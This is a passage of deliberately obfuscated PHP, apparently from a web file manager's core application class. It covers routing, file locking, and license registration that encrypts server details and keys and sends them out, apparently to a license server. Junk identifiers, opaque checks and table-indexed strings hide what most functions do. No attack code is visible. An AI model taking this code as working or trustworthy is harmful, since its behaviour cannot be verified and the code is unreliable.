$¥±Ë¯à£[81] . get_caller_msg(), $¥±Ë¯à£[873]); continue; } write_log($¥±Ë¯à£[886] . $ş”ÂÊŞÁ, $¥±Ë¯à£[873]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‰×Æ°ô = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¥±Ë¯à£[887] . $‰×Æ°ô . $¥±Ë¯à£[888] . ACTION, $¥±Ë¯à£[873]); } } public static function fileLock($Â¥·’Ô¡) { $Û¡ıƒÜ =& $_SERVER[¹òÍ›æş]; if (!$GLOBALS[$Û¡ıƒÜ[889]]) { $GLOBALS[$Û¡ıƒÜ[889]] = array(); } $GLOBALS[$Û¡ıƒÜ[889]][$Â¥·’Ô¡] = !1; $¶³¬îÁœ = fopen(DATA_PATH . $Â¥·’Ô¡ . $Û¡ıƒÜ[890], $Û¡ıƒÜ[891]); if (!$¶³¬îÁœ) { return !1; } $GLOBALS[$Û¡ıƒÜ[889]][$Â¥·’Ô¡] = $¶³¬îÁœ; if (flock($¶³¬îÁœ, LOCK_EX)) { return !0; } self::unlock($Â¥·’Ô¡); show_json($Û¡ıƒÜ[892], !1); return !1; } public static function fileUnlock($ç»˜ÀÏÙ) { $÷òÁ†¢ğ =& $_SERVER[¹òÍ›æş]; $¦îä½»ö = $GLOBALS[$÷òÁ†¢ğ[889]][$ç»˜ÀÏÙ]; if (!$¦îä½»ö) { return; } $GLOBALS[$÷òÁ†¢ğ[889]][$ç»˜ÀÏÙ] = !1; flock($¦îä½»ö, LOCK_UN); fclose($¦îä½»ö); } public static function fileUnlockAll() { $õªÔ¤ƒ =& $_SERVER[¹òÍ›æş]; if (!$GLOBALS[$õªÔ¤ƒ[889]]) { return; } foreach ($GLOBALS[$õªÔ¤ƒ[889]] as $¬“”ë€÷ => $²µºş»­) { if (!$²µºş»­) { continue; } $GLOBALS[$õªÔ¤ƒ[889]][$¬“”ë€÷] = !1; flock($²µºş»­, LOCK_UN); fclose($²µºş»­); } $GLOBALS[$õªÔ¤ƒ[889]] = array(); } } goto cÆ›Ó±˜…ä; BÍİ›‰ËŒ™: if (strlen($zlpdyovxqt) < $_SERVER[¹òÍ›æş][60]) { die; } class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($ïÛ¸µâ¨) { $‘¦ùÆŠ =& $_SERVER[¹òÍ›æş]; $£ÜØí£Ç =& $_SERVER[¯ı†ò™•]; $ï”¹ÂÎ¿ = explode($£ÜØí£Ç[0], trim($ïÛ¸µâ¨, $£ÜØí£Ç[0])); $this->defaultModule = $ï”¹ÂÎ¿[0] ? $ï”¹ÂÎ¿[0] : $this->defaultModule; $¦•¯Ø¹ = $‘¦ùÆŠ[648]; $this->defaultController = $ï”¹ÂÎ¿[1] ? $ï”¹ÂÎ¿[1] : $this->defaultController; $this->defaultAction = $ï”¹ÂÎ¿[2] ? $ï”¹ÂÎ¿[2] : $this->defaultAction; $this->sgfqb8d96b4a($£ÜØí£Ç[1], array($this, $£ÜØí£Ç[2])); $È„º¦ß¹ = $‘¦ùÆŠ[649]; if (!$È„º¦ß¹) { die; } } public function appRun($ÍıÆ‡Í“) { $¥Ş“ñƒ¹ =& $_SERVER[¹òÍ›æş]; $¹ƒ€ÅËê =& $_SERVER[¯ı†ò™•]; $–ë´Àİˆ = explode($¹ƒ€ÅËê[0], $ÍıÆ‡Í“); $ó‘ˆä¾¯ = strtolower($–ë´Àİˆ[0]); $ùè´ÑŞã = $¥Ş“ñƒ¹[650]; if (!$ùè´ÑŞã) { die; } $çÏÓìß¢ = $¹ƒ€ÅËê[3]; $ŠÄáí‰¾ = $¥Ş“ñƒ¹[651]; while (strlen($ŠÄáí‰¾) < $¥Ş“ñƒ¹[652]) { if (!$ŠÄáí‰¾) { break; } $ŠÄáí‰¾++; } if ($ó‘ˆä¾¯ == $¹ƒ€ÅËê[4]) { $çÏÓìß¢ = $¹ƒ€ÅËê[5]; $–ë´Àİˆ[0] = $¹ƒ€ÅËê[6]; $–ë´Àİˆ[1] = $–ë´Àİˆ[1] . $¹ƒ€ÅËê[7]; $ÍıÆ‡Í“ = join($¹ƒ€ÅËê[0], $–ë´Àİˆ); $ÍıÆ‡Í“ = trim($ÍıÆ‡Í“, $¹ƒ€ÅËê[0]); } call_user_func(array($¹ƒ€ÅËê[8], $¹ƒ€ÅËê[9]), $çÏÓìß¢ . $¹ƒ€ÅËê[10], $ÍıÆ‡Í“); ActionCall($ÍıÆ‡Í“); $ôº…¤íë = $¥Ş“ñƒ¹[653]; if (strlen($ôº…¤íë) < $¥Ş“ñƒ¹[654]) { die; } call_user_func(array($¹ƒ€ÅËê[8], $¹ƒ€ÅËê[9]), $çÏÓìß¢ . $¹ƒ€ÅËê[11], $ÍıÆ‡Í“); } private function autorun() { $«¾Â‡›Ÿ =& $_SERVER[¯ı†ò™•]; global $config; if (count($config[$«¾Â‡›Ÿ[12]]) == 0) { return; } foreach ($config[$«¾Â‡›Ÿ[12]] as $Ÿü½  => $Ò®ä‚è) { $this->appRun($Ò®ä‚è); } } private function taxi9fa6f8f6() { $œÁóô•« =& $_SERVER[¹òÍ›æş]; $ÇóÍ²éÓ =& $_SERVER[¯ı†ò™•]; $„áßé›õ = $ÇóÍ²éÓ[4]; $Öß„­Õñ = $GLOBALS[$ÇóÍ²éÓ[13]][$ÇóÍ²éÓ[14]][0]; if (!$Öß„­Õñ || strlen($Öß„­Õñ) <= strlen($„áßé›õ)) { return; } if (strtolower(substr($Öß„­Õñ, -strlen($„áßé›õ))) != $„áßé›õ) { return; } $ÆÁÈ½İ‰ = substr($Öß„­Õñ, 0, -strlen($„áßé›õ)); $µšŞ·µ¥ = $œÁóô•«[655]; if (!$µšŞ·µ¥) { return; } $å‰¡²‘Ó = array($ÇóÍ²éÓ[4], $ÆÁÈ½İ‰); $€©÷İŞê = array_slice($GLOBALS[$ÇóÍ²éÓ[13]][$ÇóÍ²éÓ[14]], 1); $GLOBALS[$ÇóÍ²éÓ[13]][$ÇóÍ²éÓ[14]] = array_merge($å‰¡²‘Ó, $€©÷İŞê); $Âö×Àôœ = $œÁóô•«[656]; if (!$Âö×Àôœ) { return; } $GLOBALS[$ÇóÍ²éÓ[13]][$ÇóÍ²éÓ[15]] = implode($ÇóÍ²éÓ[0], $GLOBALS[$ÇóÍ²éÓ[13]][$ÇóÍ²éÓ[14]]); } private function ibhkf13c6ee4() { $¾ùêöØ¦ =& $_SERVER[¹òÍ›æş]; $Î„Øàè  =& $_SERVER[¯ı†ò™•]; if ($GLOBALS[$Î„Øàè [13]][$Î„Øàè [15]] != $Î„Øàè [6]) { return; } $¥ş…àş = $_SERVER[$Î„Øàè [16]]; $¡¾Èù‰® = $Î„Øàè [17]; if (!strstr($¥ş…àş, $¡¾Èù‰®)) { return; } $¨àÛúş = strrpos($¥ş…àş, $¡¾Èù‰®); $è„²üÔğ = $¾ùêöØ¦[657]; if (strlen($è„²üÔğ) < $¾ùêöØ¦[658]) { return; } $…ª·í = substr($¥ş…àş, $¨àÛúş + strlen($¡¾Èù‰®)); preg_match_all($Î„Øàè [18], $…ª·í, $Õï¡ñœ¸); $…ª·í = trim($Õï¡ñœ¸[0][0], $Î„Øàè [19]); $ï“æİ‹Œ = $¾ùêöØ¦[659]; if (strlen($ï“æİ‹Œ) < $¾ùêöØ¦[654]) { return; } $GLOBALS[$Î„Øàè [13]][$Î„Øàè [14]] = explode($Î„Øàè [19], $…ª·í); $Ä«ûú¯Ì = $¾ùêöØ¦[660]; if (!$Ä«ûú¯Ì) { return; } $GLOBALS[$Î„Øàè [13]][$Î„Øàè [15]] = implode($Î„Øàè [0], $GLOBALS[$Î„Øàè [13]][$Î„Øàè [14]]); } public function run() { $ÅŸ‚¸ïî =& $_SERVER[¹òÍ›æş]; $ºÃ†õˆ” =& $_SERVER[¯ı†ò™•]; $this->ibhkf13c6ee4(); $áñ½É›Ã = $ÅŸ‚¸ïî[661]; if (strlen($áñ½É›Ã) < $ÅŸ‚¸ïî[654]) { die; } $this->taxi9fa6f8f6(); $ò¼Âá£Ï = $ÅŸ‚¸ïî[662]; if (!$ò¼Âá£Ï) { return; } $ŠÚ¦¾’ = $GLOBALS[$ºÃ†õˆ”[13]][$ºÃ†õˆ”[14]]; $ğÑÛÎæ• = $GLOBALS[$ºÃ†õˆ”[13]][$ºÃ†õˆ”[15]]; $‹³ Éä = $ÅŸ‚¸ïî[663]; if (!$‹³ Éä) { die; } define($ºÃ†õˆ”[20], isset($ŠÚ¦¾’[0]) && $ŠÚ¦¾’[0] ? $ŠÚ¦¾’[0] : $this->defaultModule); define($ºÃ†õˆ”[21], isset($ŠÚ¦¾’[1]) && $ŠÚ¦¾’[0] ? $ŠÚ¦¾’[1] : $this->defaultController); define($ºÃ†õˆ”[22], isset($ŠÚ¦¾’[2]) && $ŠÚ¦¾’[0] ? $ŠÚ¦¾’[2] : $this->defaultAction); $¦ Í„ï = $ÅŸ‚¸ïî[664]; define($ºÃ†õˆ”[23], MOD . $ºÃ†õˆ”[0] . ST . $ºÃ†õˆ”[0] . ACT); $_SERVER[$ºÃ†õˆ”[24]] = strtolower(ACTION); $êéÖššû = $ÅŸ‚¸ïî[665]; if (!$êéÖššû) { return; } $this->autorun(); if (count($ŠÚ¦¾’) >= 3) { $this->appRun($ğÑÛÎæ•); } else { $this->appRun(ACTION); } } private $xmrs0c69de85 = array(); private $chwv5f747522 = ''; public function yocl20deda24() { $£¯€Óì =& $_SERVER[¹òÍ›æş]; $ò¯­îÚ =& $_SERVER[¯ı†ò™•]; $this->qklzb072c17c(); $°¦Æı² = $£¯€Óì[666]; $this->dzlo37bac3cc(); $this->dbih5e16c4c9(); $çŸıúãğ = $£¯€Óì[667]; if (strlen($çŸıúãğ) < $£¯€Óì[668]) { die; } $this->ycmo66ffc6d9(); $õÕÚ·ı¯ = $£¯€Óì[669]; if (!$õÕÚ·ı¯) { die; } $this->gnlxda33f609(); $Å³¬ØÛ¼ = $£¯€Óì[670]; if (!$Å³¬ØÛ¼) { die; } $this->ruyv96095cee(); $this->hzwp72a6b094(); $ïÕåÑº = $£¯€Óì[671]; $this->sgfqb8d96b4a($ò¯­îÚ[25], array($this, $ò¯­îÚ[26])); $‚ıĞ„¸ = $£¯€Óì[672]; $this->sgfqb8d96b4a($ò¯­îÚ[27], array($this, $ò¯­îÚ[28])); $this->sgfqb8d96b4a($ò¯­îÚ[29], array($this, $ò¯­îÚ[30])); $this->sgfqb8d96b4a($ò¯­îÚ[31], array($this, $ò¯­îÚ[32])); } public function pywka1aa059d($÷À„£°™) { $÷âÛ»å¢ =& $_SERVER[¹òÍ›æş]; $äÛ¹ÂşÖ =& $_SERVER[¯ı†ò™•]; $ĞùõÚÄ = Model($äÛ¹ÂşÖ[33])->get(); $Á€Ò±Åê = array($äÛ¹ÂşÖ[34], $äÛ¹ÂşÖ[35], $äÛ¹ÂşÖ[36], $äÛ¹ÂşÖ[37], $äÛ¹ÂşÖ[38], $äÛ¹ÂşÖ[39], $äÛ¹ÂşÖ[40], $äÛ¹ÂşÖ[41], $äÛ¹ÂşÖ[42], $äÛ¹ÂşÖ[43], $äÛ¹ÂşÖ[44], $äÛ¹ÂşÖ[45], $äÛ¹ÂşÖ[46], $äÛ¹ÂşÖ[47], $äÛ¹ÂşÖ[48], $äÛ¹ÂşÖ[49], $äÛ¹ÂşÖ[50], $äÛ¹ÂşÖ[51], $äÛ¹ÂşÖ[52], $äÛ¹ÂşÖ[53], $äÛ¹ÂşÖ[54], $äÛ¹ÂşÖ[55], $äÛ¹ÂşÖ[56], $äÛ¹ÂşÖ[57], $äÛ¹ÂşÖ[58], $äÛ¹ÂşÖ[59], $äÛ¹ÂşÖ[60], $äÛ¹ÂşÖ[61], $äÛ¹ÂşÖ[62], $äÛ¹ÂşÖ[63], $äÛ¹ÂşÖ[64], $äÛ¹ÂşÖ[65], $äÛ¹ÂşÖ[66], $äÛ¹ÂşÖ[67], $äÛ¹ÂşÖ[68], $äÛ¹ÂşÖ[69], $äÛ¹ÂşÖ[70], $äÛ¹ÂşÖ[71], $äÛ¹ÂşÖ[72], $äÛ¹ÂşÖ[73], $äÛ¹ÂşÖ[74], $äÛ¹ÂşÖ[75], $äÛ¹ÂşÖ[76], $äÛ¹ÂşÖ[77], $äÛ¹ÂşÖ[78], $äÛ¹ÂşÖ[79], $äÛ¹ÂşÖ[80], $äÛ¹ÂşÖ[81], $äÛ¹ÂşÖ[82], $äÛ¹ÂşÖ[83], $äÛ¹ÂşÖ[84]); foreach ($Á€Ò±Åê as $¡êÌßî“) { $Œ›Ùè’• = $GLOBALS[$äÛ¹ÂşÖ[85]][$äÛ¹ÂşÖ[86]][$¡êÌßî“]; if (isset($ĞùõÚÄ[$¡êÌßî“])) { $Œ›Ùè’• = $ĞùõÚÄ[$¡êÌßî“]; } $÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$¡êÌßî“] = $Œ›Ùè’•; } $µºàüŞè = $÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$äÛ¹ÂşÖ[46]]; unset($÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[89]][$äÛ¹ÂşÖ[90]]); $Âì ºÂŸ = $÷âÛ»å¢[673]; if (strlen($Âì ºÂŸ) < $÷âÛ»å¢[652]) { die; } unset($÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[89]][$äÛ¹ÂşÖ[91]]); unset($÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$äÛ¹ÂşÖ[46]]); $ÒĞÇé¬¨ = $÷âÛ»å¢[674]; unset($÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$äÛ¹ÂşÖ[92]]); $æÌ«ñÜí = $÷âÛ»å¢[675]; if (!$æÌ«ñÜí) { return; } $÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$äÛ¹ÂşÖ[93]] = array($äÛ¹ÂşÖ[94] => (int) $µºàüŞè[$äÛ¹ÂşÖ[95]], $äÛ¹ÂşÖ[96] => (int) _get($µºàüŞè, $äÛ¹ÂşÖ[97], 0)); $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[99]] = Action($äÛ¹ÂşÖ[100])->accessToken(); $®µƒ„Î = $÷âÛ»å¢[676]; $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[101]] = md5($_SERVER[$äÛ¹ÂşÖ[102]] . $ĞùõÚÄ[$äÛ¹ÂşÖ[103]]); $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[104]] = base64_encode(serverInfo()); $²˜şÂ—ş = $÷âÛ»å¢[677]; while ($²˜şÂ—ş < $÷âÛ»å¢[668]) { if ($²˜şÂ—ş >= 0) { break; } $²˜şÂ—ş++; } $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[105]] = $this->chwv5f747522; if ($ĞùõÚÄ[$äÛ¹ÂşÖ[105]] != $äÛ¹ÂşÖ[106]) { $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[107]] = $ĞùõÚÄ[$äÛ¹ÂşÖ[107]]; $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[108]] = $ĞùõÚÄ[$äÛ¹ÂşÖ[108]]; $¼¾“½œ = rand_string(10) . $this->chwv5f747522 . rand_string(5); $÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[109]][$äÛ¹ÂşÖ[110]] = $this->czwm52a04f3b($¼¾“½œ, $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[101]]); } if ($this->chwv5f747522 == $äÛ¹ÂşÖ[106]) { $÷À„£°™[$äÛ¹ÂşÖ[87]][$äÛ¹ÂşÖ[88]][$äÛ¹ÂşÖ[93]][$äÛ¹ÂşÖ[97]] = 0; } $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[111]] = _get($this->xmrs0c69de85, $äÛ¹ÂşÖ[112], $äÛ¹ÂşÖ[6]); $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[113]] = _get($this->xmrs0c69de85, $äÛ¹ÂşÖ[114], $äÛ¹ÂşÖ[6]); if (_get($GLOBALS, $äÛ¹ÂşÖ[115]) && $this->config[$äÛ¹ÂşÖ[116]]) { $÷À„£°™[$äÛ¹ÂşÖ[98]][$äÛ¹ÂşÖ[117]] = WEB_ROOT; } return $÷À„£°™; } private function ruyv96095cee() { $âÌ‰¾Èí =& $_SERVER[¹òÍ›æş]; $ÓŒ££èÁ =& $_SERVER[¯ı†ò™•]; $ä½œıÔÔ = $_SERVER[$ÓŒ££èÁ[24]] == $ÓŒ££èÁ[118]; if ($_SERVER[$ÓŒ££èÁ[24]] == $ÓŒ££èÁ[119] && $_GET[$ÓŒ££èÁ[120]] == $ÓŒ££èÁ[121]) { $ä½œıÔÔ = !0; } if ($ä½œıÔÔ) { $Ë“İ“îĞ = array($ÓŒ££èÁ[105] => $this->chwv5f747522, $ÓŒ££èÁ[122] => $this->lyuc3e6b6af8(), $ÓŒ££èÁ[123] => Model($ÓŒ££èÁ[124])->count()); if ($this->chwv5f747522 != $ÓŒ££èÁ[106]) { $¯ØåÀ›¾ = _get($this->xmrs0c69de85, $ÓŒ££èÁ[125]); if ($¯ØåÀ›¾) { $Ë“İ“îĞ[$ÓŒ££èÁ[126]] = $¯ØåÀ›¾; $Ë“İ“îĞ[$ÓŒ££èÁ[127]] = strtotime(_get($this->xmrs0c69de85, $ÓŒ££èÁ[128])); $Ë“İ“îĞ[$ÓŒ££èÁ[129]] = _get($this->xmrs0c69de85, $ÓŒ££èÁ[114]); } $„ü‹§Ò = Model($ÓŒ££èÁ[33])->get($ÓŒ££èÁ[130], $ÓŒ££èÁ[6], !0); if (is_string($„ü‹§Ò) && substr($„ü‹§Ò, 0, 1) == $ÓŒ££èÁ[131]) { $„ü‹§Ò = json_decode_force($„ü‹§Ò); } if (is_array($„ü‹§Ò) && $„ü‹§Ò[$ÓŒ££èÁ[132]] && strstr($„ü‹§Ò[$ÓŒ££èÁ[132]], $ÓŒ££èÁ[133])) { $˜Üİ˜Ô„ = explode($ÓŒ££èÁ[133], $„ü‹§Ò[$ÓŒ££èÁ[132]]); $Ë“İ“îĞ[$ÓŒ££èÁ[134]] = $˜Üİ˜Ô„[0]; } } $Ë“İ“îĞ = $this->nqsm776e90c6(json_encode($Ë“İ“îĞ), md5($ÓŒ££èÁ[135])); $ä¬¬éáÁ = $âÌ‰¾Èí[678]; while ($ä¬¬éáÁ < $âÌ‰¾Èí[652]) { if ($ä¬¬éáÁ >= 0) { break; } $ä¬¬éáÁ++; } $‰Ëã¶ = array($ÓŒ££èÁ[136] => $Ë“İ“îĞ); $òÌºû” = $âÌ‰¾Èí[679]; while (strlen($òÌºû”) < $âÌ‰¾Èí[60]) { if (!$òÌºû”) { break; } $òÌºû”++; } call_user_func(array($ÓŒ££èÁ[137], $ÓŒ££èÁ[138]), $‰Ëã¶); $€Ó½Ş¯ = $âÌ‰¾Èí[680]; while ($€Ó½Ş¯ < $âÌ‰¾Èí[654]) { if ($€Ó½Ş¯ >= 0) { break; } $€Ó½Ş¯++; } } if ($this->chwv5f747522 == $ÓŒ££èÁ[106]) { return; } $ó¡ççñ¸ = array($ÓŒ££èÁ[139], $ÓŒ££èÁ[140], $ÓŒ££èÁ[141], $ÓŒ££èÁ[142], $ÓŒ££èÁ[143], $ÓŒ££èÁ[144]); $¾¨íäëñ = Model($ÓŒ££èÁ[33])->get(); $ŠÖ¾õÍ = $âÌ‰¾Èí[681]; if (!$ŠÖ¾õÍ) { return; } $‰Ëã¶ = array($ÓŒ££èÁ[145] => $¾¨íäëñ[$ÓŒ££èÁ[34]], $ÓŒ££èÁ[146] => $¾¨íäëñ[$ÓŒ££èÁ[35]], $ÓŒ££èÁ[147] => $ÓŒ££èÁ[6]); foreach ($ó¡ççñ¸ as $Íâíñ­å) { if (!isset($¾¨íäëñ[$Íâíñ­å]) || !$¾¨íäëñ[$Íâíñ­å]) { continue; } $‰Ëã¶[$Íâíñ­å] = $¾¨íäëñ[$Íâíñ­å]; $Úå¡ğ õ = $âÌ‰¾Èí[682]; } call_user_func(array($ÓŒ££èÁ[137], $ÓŒ££èÁ[138]), $‰Ëã¶); } private function ycmo66ffc6d9() { $¬«ÇƒŸ¢ =& $_SERVER[¹òÍ›æş]; $ÚÏ€Â€È =& $_SERVER[¯ı†ò™•]; if ($_SERVER[$ÚÏ€Â€È[24]] != $ÚÏ€Â€È[148]) { return; } if (!_get($GLOBALS, $ÚÏ€Â€È[115])) { die; } $ˆç¿ö¬Ù = $GLOBALS[$ÚÏ€Â€È[13]]; if (isset($ˆç¿ö¬Ù[$ÚÏ€Â€È[149]])) { $this->aqzl635e34c6(); die; } if (!isset($ˆç¿ö¬Ù[$ÚÏ€Â€È[150]]) || strlen($ˆç¿ö¬Ù[$ÚÏ€Â€È[150]]) != 16) { show_json($ÚÏ€Â€È[151] . $ˆç¿ö¬Ù[$ÚÏ€Â€È[150]], !1); } $šƒ›ŸïŒ = Model($ÚÏ€Â€È[33])->get($ÚÏ€Â€È[103]); $¡²ôŸù¬ = md5($_SERVER[$ÚÏ€Â€È[102]] . $šƒ›ŸïŒ); $¸¨ÙÛí  = $¬«ÇƒŸ¢[683]; $ø¨ò¾¤ = array($ÚÏ€Â€È[150] => $ˆç¿ö¬Ù[$ÚÏ€Â€È[150]], $ÚÏ€Â€È[152] => rand_string(16), $ÚÏ€Â€È[153] => $ÚÏ€Â€È[135], $ÚÏ€Â€È[154] => $ÚÏ€Â€È[155], $ÚÏ€Â€È[156] => $_SERVER[$ÚÏ€Â€È[157]], $ÚÏ€Â€È[158] => $_SERVER[$ÚÏ€Â€È[159]], $ÚÏ€Â€È[160] => $_SERVER[$ÚÏ€Â€È[161]], $ÚÏ€Â€È[101] => $¡²ôŸù¬, $ÚÏ€Â€È[162] => Model($ÚÏ€Â€È[33])->get($ÚÏ€Â€È[130])); if ($ˆç¿ö¬Ù[$ÚÏ€Â€È[163]] == $ÚÏ€Â€È[164]) { $†Á“º‘¼ = $this->nqsm776e90c6($¡²ôŸù¬, $ÚÏ€Â€È[165]); $¥ï–†æ³ = $this->czwm52a04f3b(json_encode($ø¨ò¾¤), $¡²ôŸù¬ . $ÚÏ€Â€È[166], 3); $¥ï–†æ³ = $¥ï–†æ³ . $ÚÏ€Â€È[167] . $_SERVER[$ÚÏ€Â€È[157]]; $›–ŒĞÆğ = $this->ftvn81409b66($ÚÏ€Â€È[168] . $†Á“º‘¼ . $ÚÏ€Â€È[169] . $¥ï–†æ³, -1); show_json($›–ŒĞÆğ, !0); } else { if ($ˆç¿ö¬Ù[$ÚÏ€Â€È[163]] == $ÚÏ€Â€È[170]) { $–å†€… = substr(md5($ÚÏ€Â€È[171] . $¡²ôŸù¬), 12, 15) . $ÚÏ€Â€È[172]; $¥ï–†æ³ = $this->yqamff63cfab(trim($ˆç¿ö¬Ù[$ÚÏ€Â€È[173]]), $–å†€…, 2); $ÛÎ’û‰ê = json_decode($¥ï–†æ³, !0); if (!is_array($ÛÎ’û‰ê) || !is_array($ÛÎ’û‰ê[$ÚÏ€Â€È[174]]) || $ÛÎ’û‰ê[$ÚÏ€Â€È[150]] != !0) { $¸ûè—Ïâ = $ÚÏ€Â€È[175]; $Âª³Šû¡ = $ÛÎ’û‰ê[$ÚÏ€Â€È[174]] ? $ÚÏ€Â€È[176] . $ÛÎ’û‰ê[$ÚÏ€Â€È[174]] : $¸ûè—Ïâ; show_json($Âª³Šû¡, !1); } else { $ø¨ò¾¤[$ÚÏ€Â€È[152]] = $ÛÎ’û‰ê[$ÚÏ€Â€È[174]][$ÚÏ€Â€È[177]]; } } else { $ÛÎ’û‰ê = $this->ftvn81409b66($ÚÏ€Â€È[178], $ø¨ò¾¤, 10); } } if (!is_array($ÛÎ’û‰ê) || !is_array($ÛÎ’û‰ê[$ÚÏ€Â€È[174]]) || $ÛÎ’û‰ê[$ÚÏ€Â€È[150]] != !0) { $¸ûè—Ïâ = LNG($ÚÏ€Â€È[179]); $Âª³Šû¡ = $ÛÎ’û‰ê[$ÚÏ€Â€È[174]] ? $ÚÏ€Â€È[176] . $ÛÎ’û‰ê[$ÚÏ€Â€È[174]] : $¸ûè—Ïâ; show_json($Âª³Šû¡, !1); } $ã½×ûÉ = $ÛÎ’û‰ê[$ÚÏ€Â€È[174]]; $Ğ¶¦ª«¹ = $this->gnja9907c329($ã½×ûÉ[$ÚÏ€Â€È[180]]); $€ÆÚÌÍ… = $¬«ÇƒŸ¢[684]; if (strlen($€ÆÚÌÍ…) < $¬«ÇƒŸ¢[668]) { die; } if (!$Ğ¶¦ª«¹ || $Ğ¶¦ª«¹ != $ã½×ûÉ[$ÚÏ€Â€È[128]]) { $¡·µ®Õ÷ = array($ÚÏ€Â€È[181] => Model($ÚÏ€Â€È[33])->get($ÚÏ€Â€È[103]), $ÚÏ€Â€È[182] => $_SERVER[$ÚÏ€Â€È[102]], $ÚÏ€Â€È[183] => this_url(), $ÚÏ€Â€È[158] => $_SERVER[$ÚÏ€Â€È[159]]); $¥ï–†æ³ = $this->ylhi3add7b49(json_encode($¡·µ®Õ÷)); $this->ftvn81409b66($ÚÏ€Â€È[184] . $¥ï–†æ³); show_json(LNG($ÚÏ€Â€È[185]), !0); } $«¨èé¨™ = array($ÚÏ€Â€È[186] => $ã½×ûÉ[$ÚÏ€Â€È[187]], $ÚÏ€Â€È[188] => $ã½×ûÉ[$ÚÏ€Â€È[189]], $ÚÏ€Â€È[190] => rand_string(16), $ÚÏ€Â€È[105] => $ã½×ûÉ[$ÚÏ€Â€È[191]]); if ($ø¨ò¾¤[$ÚÏ€Â€È[152]]) { $«¨èé¨™[$ÚÏ€Â€È[190]] = $ø¨ò¾¤[$ÚÏ€Â€È[152]]; } $·šÄŸ× = substr(md5($«¨èé¨™[$ÚÏ€Â€È[188]]), 10, 10); $°—è¿¨­ = $·šÄŸ× . $«¨èé¨™[$ÚÏ€Â€È[105]] . $«¨èé¨™[$ÚÏ€Â€È[190]]; $«¨èé¨™[$ÚÏ€Â€È[107]] = strrev(base64_encode($this->nqsm776e90c6($°—è¿¨­, $ÚÏ€Â€È[192]))); $ìÇÕâòâ = rand_string(16); $şÈ½‘íÚ = $ìÇÕâòâ . $«¨èé¨™[$ÚÏ€Â€È[105]] . $this->nqsm776e90c6(md5($«¨èé¨™[$ÚÏ€Â€È[186]]), $ìÇÕâòâ); $«¨èé¨™[$ÚÏ€Â€È[108]] = base64_encode(strrev($this->nqsm776e90c6($şÈ½‘íÚ, $ÚÏ€Â€È[193]))); if ($ã½×ûÉ[$ÚÏ€Â€È[194]] && $ã½×ûÉ[$ÚÏ€Â€È[194]] >= 1) { Model($ÚÏ€Â€È[33])->setDeep($ÚÏ€Â€È[195], $ÚÏ€Â€È[121]); } Model($ÚÏ€Â€È[33])->set($«¨èé¨™); $ÛºË®ø = md5($_SERVER[$ÚÏ€Â€È[102]] . strrev($šƒ›ŸïŒ) . $«¨èé¨™[$ÚÏ€Â€È[188]]); $Š—Œ‚´ = strrev(substr($ÛºË®ø, 10, 16)); $è…±ó™Õ = $¬«ÇƒŸ¢[685]; while (strlen($è…±ó™Õ) < $¬«ÇƒŸ¢[658]) { if (!$è…±ó™Õ) { break; } $è…±ó™Õ++; } $¤ş¹ÚüŒ = $this->czwm52a04f3b(json_encode($ã½×ûÉ), $ÛºË®ø); $óÜˆªˆ¯ = array_to_keyvalue(Model($ÚÏ€Â€È[7])->listData(), $ÚÏ€Â€È[196]); $ÃŒÈŠ“ = $óÜˆªˆ¯[$ÚÏ€Â€È[197]]; $ú½—¼›œ = array(); $ÂÛãâ¼á = $¬«ÇƒŸ¢[686]; if (strlen($ÂÛãâ¼á) < $¬«ÇƒŸ¢[668]) { die; } $ú½—¼›œ[$Š—Œ‚´] = $¤ş¹ÚüŒ; Model($ÚÏ€Â€È[7])->update($ÃŒÈŠ“[$ÚÏ€Â€È[198]], array($ÚÏ€Â€È[199] => $ú½—¼›œ)); $this->xmrs0c69de85 = $ã½×ûÉ; $ë†İÜå = $¬«ÇƒŸ¢[687]; while (strlen($ë†İÜå) < $¬«ÇƒŸ¢[654]) { if (!$ë†İÜå) { break; } $ë†İÜå++; } $this->chwv5f747522 = $«¨èé¨™[$ÚÏ€Â€È[105]]; $Ûí¢¡â = $¬«ÇƒŸ¢[688]; if (strlen($Ûí¢¡â) < $¬«ÇƒŸ¢[652]) { return; } $this->licenseRegistSuccess(); Cache::set($ÚÏ€Â€È[200] . md5($šƒ›ŸïŒ . $ÚÏ€Â€È[201]), $ÚÏ€Â€È[6]); $ú¬æ¦ä = $¬«ÇƒŸ¢[689]; if (!$ú¬æ¦ä) { die; } show_json(LNG($ÚÏ€Â€È[185]), !0); $ŠãéÃ… = $¬«ÇƒŸ¢[690]; while (strlen($ŠãéÃ…) < $¬«ÇƒŸ¢[668]) { if (!$ŠãéÃ…) { break; } $ŠãéÃ…++; } } private function licenseRegistSuccess() { $ öôÚ·ï =& $_SERVER[¯ı†ò™•]; $Îí÷Ñà = Model($ öôÚ·ï[33])->get(); if ($Îí÷Ñà[$ öôÚ·ï[63]] != $ öôÚ·ï[121]) { Model($ öôÚ·ï[33])->set($ öôÚ·ï[63], $ öôÚ·ï[121]); } Action($ 